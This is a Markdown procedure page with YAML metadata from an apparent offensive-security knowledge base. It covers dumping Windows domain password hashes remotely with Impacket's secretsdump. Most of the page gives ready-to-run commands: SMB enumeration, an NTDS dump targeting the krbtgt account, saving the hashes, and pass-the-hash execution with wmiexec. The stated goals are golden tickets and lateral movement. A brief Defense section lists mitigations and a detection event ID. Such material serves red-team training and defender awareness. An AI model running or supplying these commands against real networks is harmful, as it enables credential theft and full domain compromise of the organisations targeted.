---
type: procedure
description: >-
  Use Impacket's secretsdump to extract password hashes from a remote Windows
  system via SMB or DCSync.
verified: true
submitted: false
created_at: '2023-10-01T00:00:00Z'
updated_at: '2023-10-01T00:00:00Z'
tactics:
  - '[[Credential Access]]'
techniques:
  - '[[Credential Dumping]]'
sub_techniques:
  - '[[LSASS Memory]]'
  - '[[Security Account Manager]]'
tags:
  - active-directory
  - ntlm
  - pass-the-hash
  - credential-dumping
platforms:
  - Linux
  - Windows
commands:
  - '[[commands/Secretsdump-Dump-Remote-Hashes]]'
tools:
  - '[[tools/Impacket]]'
validated: true
---

# Dump-Secrets-from-Remote-Windows-System

## Summary

This procedure employs secretsdump.py to remotely dump SAM, LSA, and NTDS hashes from a Windows DC, requiring admin creds for full domain extraction.

## Description

Secrets dumping mimics DCSync for NTDS.dit or local SAM; provides NTLM hashes for pass-the-hash attacks, completing AD compromise by harvesting all user creds.

## Requirements

1. Domain admin creds
2. Impacket suite installed
3. SMB (445) and RPC access to target
4. Target DC or member with NTDS

## Defense

- Protect DA accounts with MFA and restricted logon
- Enable SAMR restrictions (MS14-025)
- Use Protected Users group for admins
- Detect DCSync via Event ID 4662 (DS replication)

## Objectives

1. Extract domain hashes
2. Obtain krbtgt for golden tickets
3. Enable PTH for lateral movement

## Instructions

### Step 1: Verify Connectivity

**Context**: Test SMB with creds.

**Command**:
```bash
smbclient -L \\$_TARGET_IP -U $_DOMAIN\\$_USERNAME%$_PASSWORD
```

> Lists shares. Expected: IPC$ accessible.

### Step 2: Run Secretsdump

**Context**: Use -just-dc for NTDS only.

**Command** ([[commands/Secretsdump-Dump-Remote-Hashes]]):
```bash
impacket-secretsdump -dc-ip $_DC_IP $_DOMAIN/$_USERNAME:$_PASSWORD@$_TARGET_IP -just-dc-user krbtgt
```

> Dumps hashes. Expected: uid:rid:lmhash:nthash.

### Step 3: Save and Parse Output

**Context**: Redirect to file; extract NTLM.

**Command**:
```bash
impacket-secretsdump ... > hashes.txt
```

> Grep for :nthash (32 hex chars).

### Step 4: Test Dumped Hashes

**Context**: Use one for PTH test.

**Command**:
```bash
wmiexec.py -hashes :$_NTHASH $_DOMAIN/$_USERNAME@$_TARGET_IP "whoami"
```

> Success: Hashes valid for use.
